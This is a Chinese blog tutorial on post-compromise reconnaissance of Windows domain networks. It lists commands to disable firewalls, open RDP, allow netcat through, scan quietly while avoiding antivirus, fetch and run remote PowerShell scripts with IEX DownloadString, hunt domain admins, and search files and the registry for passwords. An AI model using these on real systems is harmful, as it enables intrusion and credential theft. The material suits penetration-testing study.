# 内网第二章-内网基础信息搜集



# 二 . 内网信息收集

#### <font color=red> 本机信息收集 </font>
**1)查询网络配置**
```
net view    # 查看工作组

ipconfig /all   # 也可以看到是否有域
```

**2) 查询用户列表**
```
net user   # 查看本机用户列表
net localgroup administrators   # 本机管理员（通常含有域用户）
query user || qwinsta   # 查看当前在线用户（提前看看管理员是否在线）

# 企事业单位的用户名有规则性

```
**3)查询进程列表**
```
# 看装了什么软件,vpn,杀毒软件,虚拟机,某服务(推敲域内是否都装了这个软件)
# 看进程运行的权限

tasklist /v
# 或用wmic
wmic process list brief
```

**4) 查看本机服务信息**
```bash
wmic service list brief
```


**5) 查询操作系统及安装软件版本信息**
```
# 获取操作系统和版本信息()
systeminfo |findstr /B /C:"OS Name" /C:"OS Version"   # 英文版本的话是这样
systeminfo |findstr /B /C:"OS 名称" /C:"OS 版本"       # 中文版本的话是这样


# 查看系统体系结构
echo  %PROCESSOR_ARCHITECTURE%  # amd64

# 查看安装软件和版本、路径等
wmic product get name,version
# powershell查看安装软件信息
powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name,version"
```

**6) 查询端口列表**
```
netstat -ano

# 根据端口综合判断，如果是内容用来更新的服务器/DNS服务器/代理服务器
```

**7) 查询启动信息**
```bash
wmic startup get command,caption
```

**8) 查看计划任务**
```bash
schtasks /query /fo LIST /v
```

**9) 查看主机开机时间**
```bash
net statistics workstation
```

**10) 列出或断开本地计算机与所连接的客户端之间的会话**
```bash
net session
```

**11) 查询补丁信息**
```
systeminfo   #可以看到很多信息(域内主机补丁是批量打的)

# 或用wmic
wmic qfe get Caption,Description,HostFixID,InstalledOn
```

**12) 查询本机共享**
```
# 默认是开着C，IPC，ADMINS
# 不单单是看本机的信息(通过本机判断域内情况)
net share

net share \\yourHostname

wmic share get name,path,status

# wmic： 是windows自带的一个命令工具，有很多功能(交互/非交互模式)
```

**13) 查询路由表和所有可用的ARP缓存表**
```bash
route print

#
arp -a
```


**14) 查询防火墙配置**
```bash
# '查看'防火墙配置
netsh firewall show config


## '关闭'防火墙(msf里面也有)
#1.对win server 2003以及之前的版本
netsh firewall set opmode disable
#2.win server 2003之后的版本
netsh advfirewall set allprofiles state off 


# 自定义防火墙日志储存位置
netsh advfirewall set currentprofile logging filename "C:\windows\temp/fw.log"

## '修改'防火墙相关配置(比关闭防火墙动静小，改完记得恢复规则)
#1.对win server 2003以及之前的版本,允许指定程序全部连接
netsh firewall add allowprogram c:\nc.exe "allow nc" enable

#2.win server 2003之后的版本
允许指定程序连入
netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C: \nc.exe"
允许指定程序连出
netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C: \nc.exe"
允许3389端口放行
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389  action=allow 
```


**15) 查看代理配置情况**
```bash
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"

```


**16) 查询并开启远程连接服务（比较老的知识点）**
```
##### 查看远程连接端口
Reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber


###### 开启的3389方法：
# 1.通用 开3389(优化后)：
  wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
  
# 2.For Win2003:
  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
  # 或者
  wimc path win32_terminalservicesetting where (__CLASS !="") call setallowsconnections 1
  
# 3.For Win2008:
  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
  
# 4.For Every:
  cmd开3389 win08 win03 win7 win2012 winxp
  # win08，三条命令；win2012通用；win7前两条即可(权限需要run as administrator):
  wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
  wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
```


**17) 自动化信息搜集**
- 写一个脚本，把上面要搜集的信息都进行
- WMIC(win管理工具命令行)的搜集信息的写好的脚本(执行该脚本后，会自动生成一个html文件) [链接](http://www.fuzzysecurity.com/scripts/files/wmic_info.rar)


**18) Empire下的主机信息搜集**
1.Empire提供了用于收集主机信息的模块，输入命令`usemodoule situational_awareness/host/winenum`即可看到一些信息
2.`usemodoule situational_awareness/host/computerdetails` 包含了几乎所有有用的东西(但是运行这个模块需要管理员权限)



#### <font color=red> 查询当前权限 </font>
```bash
whoami    # 查询当前权限
```
**获取到一台主机的权限后，有如下三种情况：**
- 本地普通用户
- 本地管理员用户     （可以用来查询域内信息, 比如： `net view /xx/yy`）
- 域内用户(域名\用户)

本地管理员权限默认和直接提升为Ntauthority或System权限，因此，在域中，除普通用户外，所有的机器都有一个机器用户(用户名是机器名+$)。本质上，机器的system用户对应的就是域里面的机器用户，所以使用system权限可以运行域内的查询命令  

```bash
whoami /all    # 获取域SID  
net user xxx /domain  # 查询指定用户的详细信息
```



#### <font lor=red> 判断是否存在域 </font>
如果存在域，就需要判断所控主机是否在域内  

几种方法：
```
# 1.
ipconfig /all  # 可以查看网关IP地址、DNS的ip地址、域名、本机是否和dns处在同一网段
# 然后，可以通过nslookup反解析域名的ip地址，用解析得到的ip地址进行对比，判断DC和DNS是否在同一台服务器上


# 2.查看系统详细信息(有"域"的字段)，如果"域"为WORKGROUP则表示当前服务器不在域内
systeminfo 


# 3.查询当前登录域及登录用户信息("工作站域DNS名称"为域名，如果为WORKGROUP则表示当前为非域环境)
# "登录域"表示当前登录的用户是域用户还是本地用户
net config workstation


# 4.判断主域(域服务器通常会作为时间服务器使用)
net time /domain
    # 三种情况：
    1.存在域，当前用户不是域用户
    2.存在域，当前用户是域用户
    3.当前网络环境为工作组，不存在域

```

####  <font color=red> 域内存活主机探测 </font>
1. 避免除法防病毒软件报警
2. 不要使用暴力的;
3. 不要使用图形化的工具
4. 使用powershell/vbs等自带的
5. 白天上班时间探测一遍，深夜分别探测一遍（对比分析存活主机对应的IP地址i）


**1.利用`netbios`快速探测**   （优先使用这个协议,会被认为是正常的通信）
工具：`nbtbios`
使用方法
```bash
# win和Linux下都有

# 这里用win版本的，上传到目标主机(推荐放到目标机器的windows/temp下面)
nbtscan.exe 192.168.111/24
```
参数说明(结果的第三列)：

<img src="http://image.xpshuai.cn/20200307145109927_29873.png" />


**2.利用`icmp`协议快速探测内网**
工具：
1.ping命令:
```bash
# for循环ping整个网段
for /L %l in (1,1,254) Do @ping -w 1 -n 192.168.111.%l |findstr "TTL="
```

2.VBS脚本
```bash
没写

# cscript xxx.vbs 运行脚本
```


**3.利用`arp`扫描完整探测内网**
工具：
1.arp-scan 
```bash
# 上传arp.exe 到目标机器运行
Arp.exe -t 192.168.0/20
```
2.Empire中的arpscan模块
```bash
usemodule situational_awareness/net/work/arpscan
set ...
execute
```
3.NiShang里面的脚本: `Invoke-ARPScan.ps1` 
```bash
# a.远程下载运行
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.1.0/20" >> C:\windows\temp\log.txt

# b.本地运行(先上传脚本到目标)
powershell.exe -nop -exec bypass -Command "&{Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/20}" >> C:\windows\temp\log.txt

# c.无条件运行(没痕迹)

```


3.利用常规`tcp/udp端口扫描`探测内网
工具：`scanline`   (比较老, 但是好用，可在所有win版本使用，动静小)
```bash
# -t 是tcp端口， -u是udp端口
sl -h -t 22,80-89,110,389,445,3389,1099,1433,6379,27017,7001,8080,1521,3306,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt -p 192.168.1.1-254 /b

```



####  <font color=red> 扫描域内端口 </font>
通过端口，不仅能了解目标主机所开放的服务，还能找出其开放服务的漏洞、分析目标网络的拓扑结构等
- 端口的banner信息
- 端口上运行的服务
- 常见应用的默认端口

**工具：**
- 1.telent命令(针对单个，肯定不会触发报警)
```bash
telnet DC1 22  # 查看某台主机某个端口是否开放
```
- 2.S扫描器
```bash
# 早期的工具，支持大网段
S.exe TCP 192.168.1.1 192.168.1.112  22,445,3389,1433,6379,8080,80,23,21,25,110,3306,1521,111,445,7001  256  /Banner /save
# 结果默认保存在安装目录下的result.txt文件中
```
- 3.Metasploit内置的端口扫描模块:
```bash
search portscan
use auxiliary/scanner/portscan/tcp  # 还有其他模块
set ...
run
```
- 4.PowerSploit下的`Invoke-portscan.ps1`脚本 (不会下载到本地)
```bash
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1');Invoke-portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,5432,8080,3389,22' -oA C:\windows\temp\log.txt" 
```
- 5.NiShang的`Invoke-PortScan`模块
```bash
Get-Help Invoke-PortScan -full
# ResolveHost 解析主机名
Invoke-PortScan -StartAddress 192.168.0.1 -StopAddress 192.168.0.255 -ResolveHost
```
- 6.nmap
- 7.masscan
- 8.其他端口扫描工具

>注意扫描是否会触发IDS等设备


**端口Banner信息**
```bash
通过扫描发现了端口，可以使用客户端连接工具或nc，获取服务端的Banner信息 
获取Banner信息之后，可以在漏洞库中查找相应的CVE编号的POC/Exp, 在Exploit-DB、Seebug、安全焦点的BugTraq 等平台查看相关漏洞利用工具，然后到目标系统中验证漏洞是否存在，从而有针对性地进行安全加固
```

**常见端口机器攻击方向**： 
[链接](http://www.xpshuai.cn/01-信息搜集/#4.%20收集常用端口信息)


####  <font color=red> 收集域内基础信息 </font>

```
# 域用户才有权限进行以下查询（本机的system权限也可以，机器的用户名+$）

# 查询域
net view /domain  
# 查询域内所有计算机(可通过主机名对主机角色进行初步判定, 比如web可能是web服务器)
net view /domain:domainName   
net view /domain:WORKGROUP   

# 查看域内所有用户组
net group /domain    

# 查看域成员计算机列表
net group "domain computers" /domain   

# 获取域密码信息(密码策略,密码长度,错误锁定等信息)
net accounts /domain   

#  获取域信任信息
nltest /domain_trusts  
```


####  <font color=red>查找 域控制器(DC) </font>
```bash
# 查看DC的机器名
nltest /DCLIST:xxx

# 查看DC的主机名
nslookup -type=SRV _ldap._tcp

# 查看当前时间
net time /domain

# 查看域控制器组
net group "Domain Controllers"/domain

netdom query pdc
```


#### <font color=red> 域内用户和管理员的获取  </font>
1.查询所有域用户列表：
```
net user /doamin    # 向DC进行查询域用户列表
wmic useraccount get /all   # 获取域内用户详细信息
dsquery user  # 查看存在的用户
# 常用的dsquery命令
dsquery computer # 查找目录中的计算机
dsquery contact  # 查找目录中的联系人
dsquery subnet   # 查找目录中的子网
dsquery group    # 查找目录中的组
dsquery ou       # 查找目录中的组织单位
dsquery site     # 查找目录中的站点
dsquery user     # 查找目录中的用户
dsquery quota     # 查找目录中的配额规定
dsquery partition  # 查找目录中的分区
dsquery * -     # 用通用的 LDAP 查询来查找目录中的任何对象

net localgroup administrators  # 查询本地管理员组用户(实际中，为了方便管理，会有域用户被设置为域机器的本地管理员用户)
```

2.查询域管理员用户组
```bash
# 查询域管理员用户
net group "doamin admins" /domain

# 查询域管理员用户组
net group "Enterprise Admins" /domain
```


#### <font color=red>定位域管理员 (很重要)  </font>
当一台机器加入域后，会默认给域管理员组赋予本地系统管理员权限

###### 常规定位域内管理员`方法`：
> 第二种方法使用较多

1. 日志 （本地机器的管理员日志，可以使用`脚本`或`wevtuti`l导出并查看）
2. 会话 （域内每个机器的等会会话，可以匿名查询，无需权限，可以使用`netess.exe`或`powerview`等工具查询）


###### 常用的定位域管理员`工具`：
1.psloggedon.exe        
```bash
# 下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon
# 查看本地登录的用户 和 通过本地计算机或远程计算机的资源登录的用户
# 如果指定的是"用户名"而不是计算机名，则会搜索网上邻居的计算机，并显示该用户当前是否已经登录
# 某些功能需要管理员权限

psloggedon \\DC1
# - 显示支持的选项和用于输出值的单位
# -l  仅显示本地登录，不显示本地和网络资源登录
# -x  不显示登录时间
# \\computername:    指定要列出登录信息的计算机name
# username:    指定用户名
```

2.PVEFindADUser.exe      
```bash
# 下载地址： https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn
# 可用于查找活动目录
# 需要 .net 2.0, 且 需管理员权限

PVEFindADUser.exe  <参数>
# 
PVEFindADUser.exe  --current   # 显示域中所有计算机上当前登录的用户
PVEFindADUser.exe  --last   # 显示域中目标计算机上最后登录的用户
# 参数 -noping 阻止在之前ping

```

4.netsess.exe                        
```bash
# 枚举工具

netsess.exe  <参数>
# -f file.txt   指定要提取主机列表的文件
# -e file.txt   指定要排除的主机名的文件
# -o file.txt   将所有输出都重定向到指定的文件
# -d domain     指定要提取主机列表的域，若没指定，则从当前域中提取主机列表
# -g group      指定搜索的组名，若没指定，就从当前域中提取主机列表
# -c            对已找到的共享目录/文件的访问权限进行检查
```

5.NetView.exe    
```bash
# 地址： https://github.com/mubix/netview

```

6.Nmap的NSE脚本
```bash
# 下载地址   https://nmap.org/nsedoc/scripts/smb-enum-sessions.html
smb-enum-session.nse    # 获取远程机器的登录会话,查看当前是否有用户登录
smb-enum-domains.nse    # 获取主机信息、用户、可使用密码策略的用户等
smb-enum-users.nse      # 如果获得的权限有限，使用这个获得更多的域用户的信息
smb-enum-shares.nse     # 遍历远程主机的共享目录
smb-enum-processs.nse   # 对主机的系统进程进行遍历（可以知道主机正在运行什么软件）
smb-os-discovery.nse    # 收集目标的一些信息
```

7.PowerShell 中， PowerView脚本： Invoke-UserHunter   
```bash
# 下载地址： https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView

# Invoke-StealthUserHunter    只需要进行一次查询，就可以获取域里面的所有用户(隐蔽性高，但不一定全面)

# Invoke-UserHunter 找到域内特定的用户群，接收用户名、用户列表和域组查询
powershell -nop -exec bypass -Command "& {Import-Module .\PowerView.ps1; Invoke-UserHunter}" 
```

8.Empire下`user_hunter`模块
```bash
# 也有类似Invoke-UserHunter的模块： user_hunter   --> 用于查找域管理员登录的机器
usemodule situational_awareness/network/powerview/user_hunter
```



#### <font color=red>查找域管理进程 </font>
如果在无法立即拥有权限的系统中获得管理员进程，那么通常可以采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到测试的路径

###### a.本机检查
1．获取域管理员列表 
```bash
net group "domain admins" /domain
```
2．列出本机所有进程及进程用户 
```bash
tasklist /v
```
3．寻找是否有进程所有者为域管理员的进程
能用上面两种方法找到自然最好，但实际往往并非如此......

###### b.查询域控制器的与用户会话（脚本）
1. 收集域控制器的列表
```bash
# 可以使用LDAP查询
# net
net group "domain Controllers" /domain
```
2. 收集域管理员的列表
```bash
net group "domain Admins" /domain
```
3. 收集所有活动域会话的列表 
```bash
# 使用Netsess.exe插叙每个域控制器，
netsess -h
```
4. 将域管理员列表与活动会话列表交叉引用，以确定哪些IP地址具有活动域令牌
```bash
#
#也有其他的的GDA脚本(Get Domain Admins)  https://github.com/nullbind/Other-Projects/tree/master/GDA
```

如果没有会话： 隔一段时间，等着有会话 / 脚本自动隔一段时间运行

###### c.扫描远程系统上运行的任务
前提：使用了共享
<img src="http://image.xpshuai.cn/20200308144440441_12568.png" />

###### d.扫描远程系统上NetBISO信息
NetBISO是一个协议，端口137,138,139之类
也可使用工具：`nbtscan`
<img src="http://image.xpshuai.cn/20200308144903911_31072.png" />



####  <font color=red> 模拟域管理员的方法</font>
如果已经拥有了meterpreter会话，就可以使用`Incognito`来模拟域管理者添加一个域管理员，通过尝试遍历系统中所有可用的授权令牌来添加新的管理员  
第四章见




#### <font color=red> 利用 PowerShell 收集域信息</font>
###### PowerShell
PowerShell常用的执行权限共有四种，具体如下。
```
Restricted：默认设置，不允许执行任何脚本。
Allsigned：只能运行经过证书验证的脚本。
Unrestricted：权限最高，可以执行任意脚本。
RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。

在 PowerShell 中输入“Get-ExecutionPolicy”，看到为默认 Restricted 权限
```

###### PowerView
>是一款依赖 PowerShell 和 WMI 对内网域情况进行查询的常用渗透脚本，PowerView 集成在` PowerSploit` 工具包中
[下载地址](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)

BypassUAC 最直接的办法： ` -ExexutionPolicy ByPass`


**PowerView 中的常用命令**
```powershell
# 先 Import-Moudle .\PowerView.ps1

Get-NetDomain    #获取当前用户所在的域名称
Get-NetUser    #返回所有用户的详细信息
Get-NetDomainController    #获取所有域控制器
Get-NetComputer    #获取所有域内机器的详细信息
Get-NetOU    #获取域中的 OU 信息
Get-NetGroup    #获取所有域内组和组成员信息
Get-NetFileServer    #根据 SPN 获取当前域使用的文件服务器
Get-NetShare   #获取当前域内所有网络共享
Get-NetSession    #获取在指定服务器存在的会话信息
Get-NetRDPSession   # 获取在指定服务器存在的远程连接信息
Get-NetProcess    #获取远程主机的进程信息
Get-UserEvent    #获取指定用户的日志信息
Get-ADObject    #获取活动目录的对象信息
Get-NetGPO    #获取域所有组策略对象
Get-DomainPolicy   # 获取域默认或域控制器策略
Invoke-UserHunter    #用于获取域用户登录计算机及该用户是否有本地管理权限
Invoke-ProcessHunter    #查找域内所有机器进程用于找到某特定用户
Invoke-UserEventHunter    #根据用户日志获取某域用户登录过哪些域机器

```





#### <font color=red> 域分析工具 BloodHound </font>
通过图与线的方式，把域内信息直观的展示

https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip

###### 配置环境
1.下载安装jdk并配置
2.下载安装Neo4j（Neo4j Server -> Community Server->Windows）
3.启动Neo4j数据库服务端(neo4j->非关系型数据库.   进入解压后的bin，输入命令`ndo4j.bat console`启动服务)
4.浏览器输入：127.0.0.1:7474/browser，用户名密码默认`neo4j`
4.下载BloodHound, 解压后双击exe启动， 输入`bolt://localhost:7687`和账户密码，就安装好了


###### 使用
主界面按钮和选项描述：
......


**采集数据**
- 哪些用户登录了哪些机器
- 哪些用户拥有管理员权限
- 那些用户和组属于哪些组

BloodHound采集需依赖PowerView.ps1的BloodHound：
BloodHound分为两部分：
            1.PowerShell采集器脚本([SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1))
            2.可执行文件SharpHound.exe

```bash
# 使用SharpHound.exe采集域内信息
把SharpHound.exe复制到目标机器
sh.exe -c all
```

**导入数据**
在当前目录下，会生成``xxx_BloodHound.zip`压缩包  
可以把压缩文件放到界面上节点信息以外的任意位置

**查询信息**
主界面左上角的查询`Queries`, 进入模块，可以看到预定义的常用查询条件
<img src="http://image.xpshuai.cn/20200507194413982_1350438555.png" />

按住`ctrl`键，可以循环显示； 在其图标上按住鼠标左键可以移动位置





#### <font color=red> 敏感数据的防护 </font>
>价值比较高的东西基本上是全部在内网的

###### 资料/数据/文件的定位流程
1. 定位内部人事组织结构。
2. 在内部人事组织中寻找需要监视的相关人员。
3. 定位相关人员的机器。
4. 监视相关人工作时存放文档的位置。
5. 列出存放文档服务器的目录。


######  定位内部人事组织结构
**1. 人事组织结构图**
类似公司结构图可以在目标的外部站点(类如首页`“关于我们”` )和网上暴露的
信息(类如发表在`招聘网的各类岗位名称`)来分析,或者在`内网电脑中寻找`类似的人
事组织结构图, 再`结合分析人事资料里相关员工资料与域内用户名或者用户组的对应
关系`, 可以很快定位到你需要寻找的人员使用的机器


**2. 人力资源主管个人电脑**
在内网中通过上述种种方法定位到人力资源主管个人机器,通常单位人力资源主
管电脑中会存在公司所有人员的身份信息及相关材料,寻找到人力资源主管个人机器
后在其电脑中寻找公司人力资源相关文档得存放位置,然后从人力资源文档中寻找公
司相关人员信息,直至收集到你所需要的材料。

3. `net group /domain`  
可以查询域内所有用户组的信息, 同样可以利用该命令来定位公司内部人事结构
<img src="http://image.xpshuai.cn/20200506224521447_1788866667.png" />
除了内置重点组外, `自建的域组`需要特别关注
```bash
(1)IT组/研发组: 他们掌握了大量的内网密码,数据库密码等。
(2)秘书组: 他们掌握着大量的目标机构的内部传达文件和资料,为信息分析业务提供信息。
(3)财务组: 他们掌握着目标机构大量的资金往来与目标企业的规划发展,并且可以通过资金表,来判断出目标组织的整体架构。
(4)CXX组: 如ceo cto coo等,不同的组织名字不同,如部长、厂长、经理等,会拥有目标机构的机密信息
```




###### 重点核心业务机器及敏感信息防护
> 重点核心业务机器是渗透测试人员通常比较关心的机器,因此需要做好相应的防护措施。

**1.核心业务机器**
```bash
- 高管/系统管理员/财务/人事/业务人员的个人计算机。
- 产品管理系统服务器(仓库管理系统)
- OA 办公系统服务器。
- 财务应用系统服务器。
- 核心产品源码服务器(对于 IT 公司,会架设自己的 SVN 或者 GIT 服务器)
- 数据库服务器。
- 文件服务器/共享服务器。
- 邮件服务器。
- 网络监控系统服务器。
- 其他服务器(分公司、工厂)
```

**2.各类敏感文件信息**
```bash
- 站点源码备份文件、数据库备份文件、配置文件备份等(后缀 XX.zip,XX.sql 等)
- 各类数据库的 Web 管理入口,如 phpmyadmin、adminer 等。
- 浏览器密码和浏览器 cookie(IE、Chrome、Firefox)
- 其他用户会话、3389 和 ipc$连接记录、各用户回收站的信息等。
- Windows 无线密码。
- 目标内部的各种账号和密码信息,包括邮箱、VPN、FTP、TeamView 等。
```


###### 应用与文件形式的信息收集
说白了就是翻文件（包括一些应用的配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等）

不管什么途径获得的内网机器,首先需要知道的就是这台机器所属人员的职位、权利,通常一个高权利的人他在内网的权限比一般员工要高很多,他的电脑内也会有很多重要的、敏感的个人或公司内部文件。

用户在内网中工作时,建议不要将一些特别重要的资料放在公开的计算机中,必要时一定要对 Office 文档进行加密,密码也不要太过于简单

**常用搜索：**
1.搜索指定含有任意多关键字的文件名
```bash
dir c:\*.doc /s
dir /b/s password.txt
dir /b/s config.*dir /s *pass* == *cred* == *vnc* ==*.config*
```

2.搜索文件名为password.txt/xml/ini的文件,这个操作可能造成大量的输出
```
findstr /si password *.xml *.ini *.txt
```

3.搜索带有关键词的注册表项,下例中是查询的关键词是 "password"的命令
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

4.对于加密office办公软件
```bash
如果是低版本如2003的话,可以在百度搜一些网上的破解软件进行破解。

如果是高版本的话,可以在目标用户打开文件时使用微软SysinternalsSuite套装中
的抓取dump的工具-procdump来抓取内存dump,然后用内存查看器直接查看文件内容。
```


#### <font color=red> 分析域内网段划分情况及拓扑结构 </font>
###### 目标主机基本架构的判断
常见的 Web 架构：
```bash
- ASP + Access + IIS 5.0/6.0 + Windows Sever 2003
- ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008
- PHP + MySQL + IIS
- PHP + MySQL + Apache
- PHP + MySQL + Ngnix
- JSP + MySQL + Ngnix
- JSP + MSSQL + Tomcat
- JSP + Oracle + Tomcat
```


###### 域内网段划分信息
内网的环境判断,首先需要分析下内网IP分布情况,一般可以通过内网中路由器、交换机等设备、snmp、弱口令等来获取内网网络拓扑或DNS域传送信息泄漏,另外一般大公司都会有内部网站,也可通过内部网站公开内容链接找出部门ip段。

分析出内部网络是怎么划分的?是按照部门划分的网络段?还是按照楼层?还是
按照地区?通常内网可分为DMZ区、办公区和核心区(生产区),了解整个内网的网
络分布和组成,也有助于我们寻找内网核心业务。

1.DMZ 区
```bash
在实际的渗透测试中,大多数情况下,在外围 Web 中拿到的权限在 DMZ 区。这个区域不属
于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理,DMZ 区会处在内网区能够访问
DMZ 区而 DMZ 区访问不了内网区的情况下,相关知识在第 1 章中已经详细讲解过,此处不再重
复。
```
2.办公区
```bash
办公区,顾名思义,是指公司员工日常的工作区。办公区的安全防护水平一般不是高,基本
防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中,攻击者在获取权限后,利用内网
信任关系,很容易扩大攻击面。一般情况下,攻击者很少会直接到达办公区。攻击者如果想进入
办公区,可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。

办公区按照系统可分为： OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒
系统、内部应用监控系统、运维管理系统等,按照网络段可分为域管理网段、内部服务器系统网
段、各部门分区网段等。
按照网络段可分为:域管理网段、内部服务器系统网段、各部门分区网段等。
```
3.核心区
```bash
核心区一般存放企业最重要的数据、文档等信息资产,如域控制器、核心生产机器等,安全
设置也最为严格。根据目标开展的业务不同,相关服务器可能存在于不同的网段上。通过分析服
务器上运行的服务和进程,可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网
中横向移动时,会优先查找这些主机。

核心区按照系统可分为业务系统、运维监控系
按照网络段可分为:各不同的业务网段、运维监控网段、安全管理网段等。
```


###### 多层域结构分析
我们需要先分析出当前内网是否存在多层域、现在这计算机所在的域是几级子域、这个子域的域控制器及根域的域控制器是哪些、其他域的域控制器是哪些、域之间是否存在域信任关系等。


###### 绘制内网拓扑图





------


###### 基础信息搜集- 思维图
<img src="http://image.xpshuai.cn/内网信息搜集-思维图.Jpeg" />




---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/%E5%86%85%E7%BD%91%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/  

